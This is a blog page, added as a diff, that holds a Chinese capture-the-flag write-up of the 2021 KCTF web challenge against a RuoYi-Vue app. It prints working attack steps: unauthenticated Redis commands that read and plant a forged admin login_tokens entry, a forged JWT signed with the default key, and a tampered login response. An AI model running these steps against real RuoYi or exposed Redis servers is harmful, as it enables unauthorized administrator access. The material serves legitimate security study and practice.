@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="统一门派若依开源快速开发平台：https:&#x2F;&#x2F;gitee.com&#x2F;y_project&#x2F;RuoYi-Vue  前端采用Vue、Element UI 后端采用Spring Boot、Spring Security、Redis &amp; Jwt 权限认证使用Jwt，支持多终端认证系统  端口开放了 Redis 的 6379，可以进行未授权访问：  keys * 会发现存在一个缓存了用户登录 token">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021_KCTF_WEB_WP">
+<meta property="og:url" content="http://example.com/2021/05/14/2021-KCTF-WEB-WP/index.html">
+<meta property="og:site_name" content="Du1">
+<meta property="og:description" content="统一门派若依开源快速开发平台：https:&#x2F;&#x2F;gitee.com&#x2F;y_project&#x2F;RuoYi-Vue  前端采用Vue、Element UI 后端采用Spring Boot、Spring Security、Redis &amp; Jwt 权限认证使用Jwt，支持多终端认证系统  端口开放了 Redis 的 6379，可以进行未授权访问：  keys * 会发现存在一个缓存了用户登录 token">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/QaUGoWvY5VECknF.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/AO9EX5cQRCtDzrB.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/6kwOlC5eGRtbDhW.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/me5PWivzr6MGcB9.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/CtJroewEv4q5jLz.jpg">
+<meta property="article:published_time" content="2021-05-14T04:49:39.000Z">
+<meta property="article:modified_time" content="2021-05-14T05:09:00.577Z">
+<meta property="article:author" content="Du1">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/14/QaUGoWvY5VECknF.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2021_KCTF_WEB_WP</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!--
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/05/13/%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/14/2021-KCTF-WEB-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&text=2021_KCTF_WEB_WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&is_video=false&description=2021_KCTF_WEB_WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2021_KCTF_WEB_WP&body=Check out this article: http://example.com/2021/05/14/2021-KCTF-WEB-WP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&name=2021_KCTF_WEB_WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&t=2021_KCTF_WEB_WP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E9%97%A8%E6%B4%BE"><span class="toc-number">1.</span> <span class="toc-text">统一门派</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2021_KCTF_WEB_WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Du1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-05-14T04:49:39.000Z" itemprop="datePublished">2021-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="统一门派"><a href="#统一门派" class="headerlink" title="统一门派"></a>统一门派</h2><p>若依开源快速开发平台：<a target="_blank" rel="noopener" href="https://gitee.com/y_project/RuoYi-Vue">https://gitee.com/y_project/RuoYi-Vue</a></p>
+<ul>
+<li>前端采用Vue、Element UI</li>
+<li>后端采用Spring Boot、Spring Security、Redis &amp; Jwt</li>
+<li>权限认证使用Jwt，支持多终端认证系统</li>
+</ul>
+<p>端口开放了 Redis 的 6379，可以进行未授权访问：</p>
+<p><img src="https://i.loli.net/2021/05/14/QaUGoWvY5VECknF.png"></p>
+<p><code>keys *</code> 会发现存在一个缓存了用户登录 token 的 <code>login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333</code>（其它的都是别的师傅在打这个环境的时候留下的。。），可以 get 一下：<code>get &quot;login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333&quot;</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>猜测 JWT 的密钥为默认密钥，可以伪造 Admin-Token 登录，直接上演示地址获取一下：<a target="_blank" rel="noopener" href="http://vue.ruoyi.vip/index">http://vue.ruoyi.vip/index</a></p>
+<p><img src="https://i.loli.net/2021/05/14/AO9EX5cQRCtDzrB.png"></p>
+<p>Base64 解码一下就有：</p>
+<p><img src="https://i.loli.net/2021/05/14/6kwOlC5eGRtbDhW.png"></p>
+<p>然后 set 一个新的 login_tokens：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set login_tokens:f4c75427-0b4a-493c-9987-db9f8c9f4cda &quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>BP 改一下 response：</p>
+<p><img src="https://i.loli.net/2021/05/14/me5PWivzr6MGcB9.png"></p>
+<p>原来的是：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;用户不存在/密码错误&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">500</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接改为：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;Du1 says nmsl&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImY0Yzc1NDI3LTBiNGEtNDkzYy05OTg3LWRiOWY4YzlmNGNkYSJ9.2Cg8jbraYAmfFtUHCjoZYcXPnP33FfvR6ud8zrTJouC_qj3C3tq2CmV2x2scXMntgO3nKeMVMuVnc1E1pbgtMg&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/14/CtJroewEv4q5jLz.jpg"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E9%97%A8%E6%B4%BE"><span class="toc-number">1.</span> <span class="toc-text">统一门派</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/14/2021-KCTF-WEB-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&text=2021_KCTF_WEB_WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&is_video=false&description=2021_KCTF_WEB_WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2021_KCTF_WEB_WP&body=Check out this article: http://example.com/2021/05/14/2021-KCTF-WEB-WP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&title=2021_KCTF_WEB_WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&name=2021_KCTF_WEB_WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/14/2021-KCTF-WEB-WP/&t=2021_KCTF_WEB_WP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Du1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+         <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
